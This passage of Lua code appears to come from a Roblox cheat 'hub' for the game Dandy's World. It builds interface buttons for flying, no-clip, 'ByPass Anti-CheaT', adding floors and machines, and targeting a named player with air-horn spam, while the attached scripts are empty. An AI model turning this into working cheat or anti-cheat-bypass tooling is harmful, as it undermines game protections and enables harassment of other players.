-- StarterGui.DebugVersion.Title.script_content.MainFour.callatt.LocalScript
G2L["e5"] = Instance.new("LocalScript", G2L["e2"]);


-- StarterGui.DebugVersion.Title.script_content.MainFour.callatt.Static Effect
G2L["e6"] = Instance.new("Sound", G2L["e2"]);
G2L["e6"]["Name"] = [[Static Effect]];
G2L["e6"]["SoundId"] = [[rbxassetid://372770465]];

-- StarterGui.DebugVersion.Title.script_content.MainFour.callatt
G2L["e7"] = Instance.new("TextButton", G2L["c3"]);
G2L["e7"]["TextWrapped"] = true;
G2L["e7"]["TextStrokeTransparency"] = 0;
G2L["e7"]["BorderSizePixel"] = 0;
G2L["e7"]["TextScaled"] = true;
G2L["e7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e7"]["TextSize"] = 14;
G2L["e7"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["e7"]["TextColor3"] = Color3.fromRGB(14, 255, 0);
G2L["e7"]["Size"] = UDim2.new(0, 111, 0, 32);
G2L["e7"]["Name"] = [[callatt]];
G2L["e7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e7"]["Text"] = [[Anti Name Shower]];
G2L["e7"]["Position"] = UDim2.new(0.6693121790885925, 0, 0.7010869383811951, 0);

-- StarterGui.DebugVersion.Title.script_content.MainFour.callatt.UIStroke
G2L["e8"] = Instance.new("UIStroke", G2L["e7"]);
G2L["e8"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["e8"]["Thickness"] = 3;
G2L["e8"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainFour.callatt.LocalScript
G2L["e9"] = Instance.new("LocalScript", G2L["e7"]);


-- StarterGui.DebugVersion.Title.script_content.MainFour.Aut
G2L["ea"] = Instance.new("TextButton", G2L["c3"]);
G2L["ea"]["TextWrapped"] = true;
G2L["ea"]["TextStrokeTransparency"] = 0;
G2L["ea"]["BorderSizePixel"] = 0;
G2L["ea"]["TextScaled"] = true;
G2L["ea"]["BackgroundColor3"] = Color3.fromRGB(0, 255, 43);
G2L["ea"]["TextSize"] = 14;
G2L["ea"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["ea"]["TextColor3"] = Color3.fromRGB(255, 0, 5);
G2L["ea"]["Size"] = UDim2.new(0, 107, 0, 27);
G2L["ea"]["Name"] = [[Aut]];
G2L["ea"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ea"]["Text"] = [[PREVIOUS PAGE]];
G2L["ea"]["Position"] = UDim2.new(0.6904761791229248, 0, 0.9103260636329651, 0);

-- StarterGui.DebugVersion.Title.script_content.MainFour.Aut.UIStroke
G2L["eb"] = Instance.new("UIStroke", G2L["ea"]);
G2L["eb"]["Color"] = Color3.fromRGB(0, 154, 6);
G2L["eb"]["Thickness"] = 3;
G2L["eb"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainFour.Aut.LocalScript
G2L["ec"] = Instance.new("LocalScript", G2L["ea"]);


-- StarterGui.DebugVersion.Title.script_content.MainFour.callatt
G2L["ed"] = Instance.new("TextButton", G2L["c3"]);
G2L["ed"]["TextWrapped"] = true;
G2L["ed"]["TextStrokeTransparency"] = 0;
G2L["ed"]["BorderSizePixel"] = 0;
G2L["ed"]["TextScaled"] = true;
G2L["ed"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ed"]["TextSize"] = 14;
G2L["ed"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["ed"]["TextColor3"] = Color3.fromRGB(14, 255, 0);
G2L["ed"]["Size"] = UDim2.new(0, 111, 0, 32);
G2L["ed"]["Name"] = [[callatt]];
G2L["ed"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ed"]["Text"] = [[Add 10 floors]];
G2L["ed"]["Position"] = UDim2.new(0.0317460335791111, 0, 0.823369562625885, 0);

-- StarterGui.DebugVersion.Title.script_content.MainFour.callatt.UIStroke
G2L["ee"] = Instance.new("UIStroke", G2L["ed"]);
G2L["ee"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["ee"]["Thickness"] = 3;
G2L["ee"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainFour.callatt.LocalScript
G2L["ef"] = Instance.new("LocalScript", G2L["ed"]);


-- StarterGui.DebugVersion.Title.script_content.MainFour.callatt
G2L["f0"] = Instance.new("TextButton", G2L["c3"]);
G2L["f0"]["TextWrapped"] = true;
G2L["f0"]["TextStrokeTransparency"] = 0;
G2L["f0"]["BorderSizePixel"] = 0;
G2L["f0"]["TextScaled"] = true;
G2L["f0"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f0"]["TextSize"] = 14;
G2L["f0"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["f0"]["TextColor3"] = Color3.fromRGB(14, 255, 0);
G2L["f0"]["Size"] = UDim2.new(0, 111, 0, 32);
G2L["f0"]["Name"] = [[callatt]];
G2L["f0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f0"]["Text"] = [[Add 10 machines]];
G2L["f0"]["Position"] = UDim2.new(0.35185185074806213, 0, 0.823369562625885, 0);

-- StarterGui.DebugVersion.Title.script_content.MainFour.callatt.UIStroke
G2L["f1"] = Instance.new("UIStroke", G2L["f0"]);
G2L["f1"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["f1"]["Thickness"] = 3;
G2L["f1"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainFour.callatt.LocalScript
G2L["f2"] = Instance.new("LocalScript", G2L["f0"]);


-- StarterGui.DebugVersion.Title.script_content.MainFour.Aut
G2L["f3"] = Instance.new("TextButton", G2L["c3"]);
G2L["f3"]["TextWrapped"] = true;
G2L["f3"]["TextStrokeTransparency"] = 0;
G2L["f3"]["BorderSizePixel"] = 0;
G2L["f3"]["TextScaled"] = true;
G2L["f3"]["BackgroundColor3"] = Color3.fromRGB(0, 255, 43);
G2L["f3"]["TextSize"] = 14;
G2L["f3"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["f3"]["TextColor3"] = Color3.fromRGB(255, 0, 5);
G2L["f3"]["Size"] = UDim2.new(0, 107, 0, 27);
G2L["f3"]["Name"] = [[Aut]];
G2L["f3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f3"]["Text"] = [[NEXT PAGE]];
G2L["f3"]["Position"] = UDim2.new(0.6904761791229248, 0, 0.823369562625885, 0);

-- StarterGui.DebugVersion.Title.script_content.MainFour.Aut.UIStroke
G2L["f4"] = Instance.new("UIStroke", G2L["f3"]);
G2L["f4"]["Color"] = Color3.fromRGB(0, 154, 6);
G2L["f4"]["Thickness"] = 3;
G2L["f4"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainFour.Aut.LocalScript
G2L["f5"] = Instance.new("LocalScript", G2L["f3"]);


-- StarterGui.DebugVersion.Title.script_content.MainThird
G2L["f6"] = Instance.new("Frame", G2L["3"]);
G2L["f6"]["BorderSizePixel"] = 0;
G2L["f6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f6"]["BackgroundTransparency"] = 1;
G2L["f6"]["Size"] = UDim2.new(0, 378, 0, 368);
G2L["f6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f6"]["Position"] = UDim2.new(0, 0, 0.05128201097249985, 0);
G2L["f6"]["Visible"] = false;
G2L["f6"]["Name"] = [[MainThird]];

-- StarterGui.DebugVersion.Title.script_content.MainThird.Target
G2L["f7"] = Instance.new("TextLabel", G2L["f6"]);
G2L["f7"]["TextWrapped"] = true;
G2L["f7"]["TextStrokeTransparency"] = 0;
G2L["f7"]["BorderSizePixel"] = 0;
G2L["f7"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["f7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f7"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["f7"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f7"]["TextSize"] = 30;
G2L["f7"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f7"]["Size"] = UDim2.new(0, 359, 0, 30);
G2L["f7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f7"]["Text"] = [[Target]];
G2L["f7"]["Name"] = [[Target]];
G2L["f7"]["BackgroundTransparency"] = 1;
G2L["f7"]["Position"] = UDim2.new(0.024000056087970734, 0, -0.0021304255351424217, 0);

-- StarterGui.DebugVersion.Title.script_content.MainThird.Target.UICorner
G2L["f8"] = Instance.new("UICorner", G2L["f7"]);


-- StarterGui.DebugVersion.Title.script_content.MainThird.Target.LocalScript
G2L["f9"] = Instance.new("LocalScript", G2L["f7"]);


-- StarterGui.DebugVersion.Title.script_content.MainThird.TargetBox
G2L["fa"] = Instance.new("TextBox", G2L["f6"]);
G2L["fa"]["BorderSizePixel"] = 0;
G2L["fa"]["TextSize"] = 14;
G2L["fa"]["TextWrapped"] = true;
G2L["fa"]["TextScaled"] = true;
G2L["fa"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["fa"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["fa"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["fa"]["PlaceholderText"] = [[Enter Target Name Here...]];
G2L["fa"]["Size"] = UDim2.new(0, 359, 0, 30);
G2L["fa"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["fa"]["Text"] = [[]];
G2L["fa"]["Position"] = UDim2.new(0.02380952425301075, 0, 0.09569565951824188, 0);
G2L["fa"]["Name"] = [[TargetBox]];

-- StarterGui.DebugVersion.Title.script_content.MainThird.TargetBox.UICorner
G2L["fb"] = Instance.new("UICorner", G2L["fa"]);


-- StarterGui.DebugVersion.Title.script_content.MainThird.TargetBox.UIStroke
G2L["fc"] = Instance.new("UIStroke", G2L["fa"]);
G2L["fc"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainThird.bang
G2L["fd"] = Instance.new("TextButton", G2L["f6"]);
G2L["fd"]["TextWrapped"] = true;
G2L["fd"]["BorderSizePixel"] = 0;
G2L["fd"]["TextScaled"] = true;
G2L["fd"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["fd"]["TextSize"] = 14;
G2L["fd"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["fd"]["TextColor3"] = Color3.fromRGB(14, 255, 0);
G2L["fd"]["Size"] = UDim2.new(0, 111, 0, 27);
G2L["fd"]["Name"] = [[bang]];
G2L["fd"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["fd"]["Text"] = [[bang]];
G2L["fd"]["Position"] = UDim2.new(0.02380952425301075, 0, 0.21739129722118378, 0);

-- StarterGui.DebugVersion.Title.script_content.MainThird.bang.UIStroke
G2L["fe"] = Instance.new("UIStroke", G2L["fd"]);
G2L["fe"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["fe"]["Thickness"] = 3;
G2L["fe"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainThird.bang.TextLabel
G2L["ff"] = Instance.new("TextLabel", G2L["fd"]);
G2L["ff"]["TextWrapped"] = true;
G2L["ff"]["BorderSizePixel"] = 0;
G2L["ff"]["TextScaled"] = true;
G2L["ff"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ff"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["ff"]["TextSize"] = 14;
G2L["ff"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ff"]["Size"] = UDim2.new(0, 116, 0, 37);
G2L["ff"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ff"]["Text"] = [[uwu / IDK WHY I ADDED THIS]];
G2L["ff"]["BackgroundTransparency"] = 0.9990000128746033;
G2L["ff"]["Position"] = UDim2.new(-0.02637818455696106, 0, 1, 0);

-- StarterGui.DebugVersion.Title.script_content.MainThird.bang.TextLabel
G2L["100"] = Instance.new("TextLabel", G2L["fd"]);
G2L["100"]["TextWrapped"] = true;
G2L["100"]["BorderSizePixel"] = 0;
G2L["100"]["TextScaled"] = true;
G2L["100"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["100"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["100"]["TextSize"] = 14;
G2L["100"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["100"]["Size"] = UDim2.new(0, 116, 0, 37);
G2L["100"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["100"]["Text"] = [[Requires a  Air Horn (If you dont have, the script will search for you)]];
G2L["100"]["BackgroundTransparency"] = 0.9990000128746033;
G2L["100"]["Position"] = UDim2.new(1.0907388925552368, 0, 1.296296238899231, 0);

-- StarterGui.DebugVersion.Title.script_content.MainThird.callatt
G2L["101"] = Instance.new("TextButton", G2L["f6"]);
G2L["101"]["TextWrapped"] = true;
G2L["101"]["BorderSizePixel"] = 0;
G2L["101"]["TextScaled"] = true;
G2L["101"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["101"]["TextSize"] = 14;
G2L["101"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["101"]["TextColor3"] = Color3.fromRGB(14, 255, 0);
G2L["101"]["Size"] = UDim2.new(0, 111, 0, 27);
G2L["101"]["Name"] = [[callatt]];
G2L["101"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["101"]["Text"] = [[call attention to monsters]];
G2L["101"]["Position"] = UDim2.new(0.35185185074806213, 0, 0.21739129722118378, 0);

-- StarterGui.DebugVersion.Title.script_content.MainThird.callatt.UIStroke
G2L["102"] = Instance.new("UIStroke", G2L["101"]);
G2L["102"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["102"]["Thickness"] = 3;
G2L["102"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainThird.Aut
G2L["103"] = Instance.new("TextButton", G2L["f6"]);
G2L["103"]["TextWrapped"] = true;
G2L["103"]["TextStrokeTransparency"] = 0;
G2L["103"]["BorderSizePixel"] = 0;
G2L["103"]["TextScaled"] = true;
G2L["103"]["BackgroundColor3"] = Color3.fromRGB(0, 255, 43);
G2L["103"]["TextSize"] = 14;
G2L["103"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["103"]["TextColor3"] = Color3.fromRGB(255, 0, 5);
G2L["103"]["Size"] = UDim2.new(0, 107, 0, 27);
G2L["103"]["Name"] = [[Aut]];
G2L["103"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["103"]["Text"] = [[PREVIOUS PAGE]];
G2L["103"]["Position"] = UDim2.new(0.6904761791229248, 0, 0.9103260636329651, 0);

-- StarterGui.DebugVersion.Title.script_content.MainThird.Aut.UIStroke
G2L["104"] = Instance.new("UIStroke", G2L["103"]);
G2L["104"]["Color"] = Color3.fromRGB(0, 154, 6);
G2L["104"]["Thickness"] = 3;
G2L["104"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainThird.Aut.LocalScript
G2L["105"] = Instance.new("LocalScript", G2L["103"]);


-- StarterGui.DebugVersion.Title.script_content.MainThird.LocalScript
G2L["106"] = Instance.new("LocalScript", G2L["f6"]);


-- StarterGui.DebugVersion.Title.script_content.MainThird.Target
G2L["107"] = Instance.new("TextLabel", G2L["f6"]);
G2L["107"]["TextWrapped"] = true;
G2L["107"]["TextStrokeTransparency"] = 0;
G2L["107"]["BorderSizePixel"] = 0;
G2L["107"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["107"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["107"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["107"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["107"]["TextSize"] = 30;
G2L["107"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["107"]["Size"] = UDim2.new(0, 359, 0, 30);
G2L["107"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["107"]["Text"] = [[options]];
G2L["107"]["Name"] = [[Target]];
G2L["107"]["Visible"] = false;
G2L["107"]["BackgroundTransparency"] = 1;
G2L["107"]["Position"] = UDim2.new(0.024000056087970734, 0, 0.41091305017471313, 0);

-- StarterGui.DebugVersion.Title.script_content.MainThird.Target.UICorner
G2L["108"] = Instance.new("UICorner", G2L["107"]);


-- StarterGui.DebugVersion.Title.script_content.MainThird.Target.LocalScript
G2L["109"] = Instance.new("LocalScript", G2L["107"]);


-- StarterGui.DebugVersion.Title.script_content.MainThird.Target
G2L["10a"] = Instance.new("TextLabel", G2L["f6"]);
G2L["10a"]["TextWrapped"] = true;
G2L["10a"]["TextStrokeTransparency"] = 0;
G2L["10a"]["BorderSizePixel"] = 0;
G2L["10a"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["10a"]["TextScaled"] = true;
G2L["10a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["10a"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["10a"]["TextSize"] = 30;
G2L["10a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["10a"]["Size"] = UDim2.new(0, 359, 0, 37);
G2L["10a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10a"]["Text"] = [[¿¡This is the best hub in dandy world ever?!]];
G2L["10a"]["Name"] = [[Target]];
G2L["10a"]["BackgroundTransparency"] = 1;
G2L["10a"]["Position"] = UDim2.new(0.016063548624515533, 0, 0.5984130501747131, 0);

-- StarterGui.DebugVersion.Title.script_content.MainThird.Target.UICorner
G2L["10b"] = Instance.new("UICorner", G2L["10a"]);


-- StarterGui.DebugVersion.Title.script_content.MainThird.Target.LocalScript
G2L["10c"] = Instance.new("LocalScript", G2L["10a"]);


-- StarterGui.DebugVersion.Title.script_content.MainThird.Target
G2L["10d"] = Instance.new("TextLabel", G2L["f6"]);
G2L["10d"]["TextWrapped"] = true;
G2L["10d"]["BorderSizePixel"] = 0;
G2L["10d"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["10d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["10d"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["10d"]["TextSize"] = 30;
G2L["10d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["10d"]["Size"] = UDim2.new(0, 359, 0, 30);
G2L["10d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10d"]["Text"] = [[______________________________]];
G2L["10d"]["Name"] = [[Target]];
G2L["10d"]["BackgroundTransparency"] = 1;
G2L["10d"]["Position"] = UDim2.new(0.024000056087970734, 0, 0.5168913006782532, 0);

-- StarterGui.DebugVersion.Title.script_content.MainThird.Target.UICorner
G2L["10e"] = Instance.new("UICorner", G2L["10d"]);


-- StarterGui.DebugVersion.Title.script_content.MainThird.LoL
G2L["10f"] = Instance.new("TextLabel", G2L["f6"]);
G2L["10f"]["TextWrapped"] = true;
G2L["10f"]["TextStrokeTransparency"] = 0;
G2L["10f"]["BorderSizePixel"] = 0;
G2L["10f"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["10f"]["TextScaled"] = true;
G2L["10f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["10f"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["10f"]["TextSize"] = 30;
G2L["10f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["10f"]["Size"] = UDim2.new(0, 359, 0, 55);
G2L["10f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10f"]["Text"] = [[This script has been executed: ]];
G2L["10f"]["Name"] = [[LoL]];
G2L["10f"]["BackgroundTransparency"] = 1;
G2L["10f"]["Position"] = UDim2.new(0.016063548624515533, 0, 0.6581956744194031, 0);

-- StarterGui.DebugVersion.Title.script_content.MainThird.LoL.UICorner
G2L["110"] = Instance.new("UICorner", G2L["10f"]);


-- StarterGui.DebugVersion.Title.script_content.MainThird.Target
G2L["111"] = Instance.new("TextLabel", G2L["f6"]);
G2L["111"]["TextWrapped"] = true;
G2L["111"]["TextStrokeTransparency"] = 0;
G2L["111"]["BorderSizePixel"] = 0;
G2L["111"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["111"]["TextScaled"] = true;
G2L["111"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["111"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["111"]["TextSize"] = 30;
G2L["111"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["111"]["Size"] = UDim2.new(0, 359, 0, 55);
G2L["111"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["111"]["Text"] = [[0]];
G2L["111"]["Name"] = [[Target]];
G2L["111"]["BackgroundTransparency"] = 1;
G2L["111"]["Position"] = UDim2.new(0.016063548624515533, 0, 0.7234130501747131, 0);

-- StarterGui.DebugVersion.Title.script_content.MainThird.Target.UICorner
G2L["112"] = Instance.new("UICorner", G2L["111"]);


-- StarterGui.DebugVersion.Title.script_content.MainThird.Target.LocalScript
G2L["113"] = Instance.new("LocalScript", G2L["111"]);


-- StarterGui.DebugVersion.Title.script_content.MainThird.Times
G2L["114"] = Instance.new("TextLabel", G2L["f6"]);
G2L["114"]["TextWrapped"] = true;
G2L["114"]["TextStrokeTransparency"] = 0;
G2L["114"]["BorderSizePixel"] = 0;
G2L["114"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["114"]["TextScaled"] = true;
G2L["114"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["114"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["114"]["TextSize"] = 30;
G2L["114"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["114"]["Size"] = UDim2.new(0, 359, 0, 40);
G2L["114"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["114"]["Text"] = [[Times]];
G2L["114"]["Name"] = [[Times]];
G2L["114"]["BackgroundTransparency"] = 1;
G2L["114"]["Position"] = UDim2.new(0.024000056087970734, 0, 0.8728695511817932, 0);

-- StarterGui.DebugVersion.Title.script_content.MainThird.Times.UICorner
G2L["115"] = Instance.new("UICorner", G2L["114"]);


-- StarterGui.DebugVersion.Title.script_content.MainThird.Target
G2L["116"] = Instance.new("TextLabel", G2L["f6"]);
G2L["116"]["TextWrapped"] = true;
G2L["116"]["TextStrokeTransparency"] = 0;
G2L["116"]["BorderSizePixel"] = 0;
G2L["116"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["116"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["116"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["116"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["116"]["TextSize"] = 30;
G2L["116"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["116"]["Size"] = UDim2.new(0, 359, 0, 30);
G2L["116"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["116"]["Text"] = [[ByPass Anti-CheaT]];
G2L["116"]["Name"] = [[Target]];
G2L["116"]["BackgroundTransparency"] = 1;
G2L["116"]["Position"] = UDim2.new(0.02135455422103405, 0, 0.41091305017471313, 0);

-- StarterGui.DebugVersion.Title.script_content.MainThird.Target.UICorner
G2L["117"] = Instance.new("UICorner", G2L["116"]);


-- StarterGui.DebugVersion.Title.script_content.MainThird.TextButton
G2L["118"] = Instance.new("TextButton", G2L["f6"]);
G2L["118"]["TextWrapped"] = true;
G2L["118"]["TextScaled"] = true;
G2L["118"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["118"]["TextSize"] = 14;
G2L["118"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["118"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["118"]["Size"] = UDim2.new(0, 95, 0, 24);
G2L["118"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["118"]["Text"] = [[FLY]];
G2L["118"]["Position"] = UDim2.new(0.02380952425301075, 0, 0.49515217542648315, 0);

-- StarterGui.DebugVersion.Title.script_content.MainThird.TextButton.LocalScript
G2L["119"] = Instance.new("LocalScript", G2L["118"]);


-- StarterGui.DebugVersion.Title.script_content.MainThird.TextButton
G2L["11a"] = Instance.new("TextButton", G2L["f6"]);
G2L["11a"]["TextWrapped"] = true;
G2L["11a"]["TextScaled"] = true;
G2L["11a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["11a"]["TextSize"] = 14;
G2L["11a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["11a"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11a"]["Size"] = UDim2.new(0, 95, 0, 24);
G2L["11a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11a"]["Text"] = [[NoClip]];
G2L["11a"]["Position"] = UDim2.new(0.3174603283405304, 0, 0.49515217542648315, 0);

-- StarterGui.DebugVersion.Title.script_content.MainThird.TextButton.LocalScript
G2L["11b"] = Instance.new("LocalScript", G2L["11a"]);


-- StarterGui.DebugVersion.Title.script_content.MainThird.Target
G2L["11c"] = Instance.new("TextLabel", G2L["f6"]);
G2L["11c"]["TextWrapped"] = true;
G2L["11c"]["TextStrokeTransparency"] = 0;
G2L["11c"]["BorderSizePixel"] = 0;
G2L["11c"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["11c"]["TextScaled"] = true;
G2L["11c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["11c"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["11c"]["TextSize"] = 30;
G2L["11c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["11c"]["Size"] = UDim2.new(0, 162, 0, 32);
G2L["11c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11c"]["Text"] = [[I recommend you remove inviswall/borders before running this]];
G2L["11c"]["Name"] = [[Target]];
G2L["11c"]["BackgroundTransparency"] = 1;
G2L["11c"]["Position"] = UDim2.new(0.5687830448150635, 0, 0.4924347996711731, 0);

-- StarterGui.DebugVersion.Title.script_content.MainThird.Target.UICorner
G2L["11d"] = Instance.new("UICorner", G2L["11c"]);


-- StarterGui.DebugVersion.Title.script_content.MainThird.Target.LocalScript
G2L["11e"] = Instance.new("LocalScript", G2L["11c"]);


-- StarterGui.DebugVersion.Title.script_content.MainThird.Aut
G2L["11f"] = Instance.new("TextButton", G2L["f6"]);
G2L["11f"]["TextWrapped"] = true;
G2L["11f"]["TextStrokeTransparency"] = 0;
G2L["11f"]["BorderSizePixel"] = 0;
G2L["11f"]["TextScaled"] = true;
G2L["11f"]["BackgroundColor3"] = Color3.fromRGB(0, 255, 43);
G2L["11f"]["TextSize"] = 14;
G2L["11f"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["11f"]["TextColor3"] = Color3.fromRGB(255, 0, 5);
G2L["11f"]["Size"] = UDim2.new(0, 107, 0, 27);
G2L["11f"]["Name"] = [[Aut]];
G2L["11f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11f"]["Text"] = [[NEXT PAGE]];
G2L["11f"]["Position"] = UDim2.new(0.01587301678955555, 0, 0.9103260636329651, 0);

-- StarterGui.DebugVersion.Title.script_content.MainThird.Aut.UIStroke
G2L["120"] = Instance.new("UIStroke", G2L["11f"]);
G2L["120"]["Color"] = Color3.fromRGB(0, 154, 6);
G2L["120"]["Thickness"] = 3;
